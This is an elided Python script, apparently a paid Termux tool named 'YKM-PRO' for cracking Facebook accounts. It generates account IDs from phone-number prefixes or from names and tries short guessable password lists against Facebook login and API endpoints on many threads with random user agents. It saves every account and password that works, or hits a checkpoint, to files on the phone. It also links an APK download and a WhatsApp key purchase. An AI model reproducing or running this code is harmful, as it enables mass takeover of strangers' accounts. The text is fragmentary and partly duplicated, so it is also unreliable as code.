...
for xd in range(10000):
        ...
        b=random.choice(['6','7','8','9','10','11','12','12.0.4','12.0.5','13'])
        c=f' TL-tl; {str(gt)}'
...
for agent in range(10000):
        ...
        b=random.choice(['6','7','8','9','10','11','12','12.0.3','12.0.4'])
 ...
 \  $$ /$$/ | $$ /$$/ | $$$$  /$$$$
  \  $$$$/  | $$$$$/  | $$ $$/$$ $$
   \  $$/   | $$  $$  | $$  $$$| $$
    | $$    | $$\  $$ | $$\  $ | $$
    | $$    | $$ \  $$| $$ \/  | $$
    |__/    |__/  \__/|__/     |__/  \033[1;34m𝐏\033[1;37m \033[1;31m 𝐑 \033[1;37m \033[1;35m𝐎 \033[1;37m
\033[1;32m----------------------------------------------
 Editor    : Min Htet
 Github    : You Know Myanmar
 Facebook  : Mr.MinHtet404
 Tool Name : YKM-PRO
 Type type : PAID
 Version   : \033[1;31m1.0.1 \033[1;37m
\033[1;36m----------------------------------------------
 YKM Pro version 1.0.1
 For Haters: I don`t fucking care anyone🤞
\033[1;36m----------------------------------------------""")
def linex():
        print('\033[1;36m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/YKM_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi YKM Sir, I Need To Buy Your Paid YKM PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python YKM.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def my():
                user=[]
                clear()
                print('\033[1;31m Code example: 95945,95997,95967,95976')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as YKM:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khantkhant','khant1122','khant12345','khant1234','khant12','khant786','khant123','khant123456','khantkhant123','']
                                YKM.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def my():
                user=[]
                clear()
                print('\033[1;31m Code example: 95997,95945,95976,95969')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: aung, kyaw, aung, may\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: aung, kyaw, thu, zin \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [YKM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        YKM=session.cookies.get_dict().keys()
                        if "c_user" in YKM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [YKM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/YKM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in YKM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [YKM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YKM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [YKM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YKM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/YKM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [YKM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/YKM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [YKM-OK] '+uid+' | '+pas+'\033[1;97m')
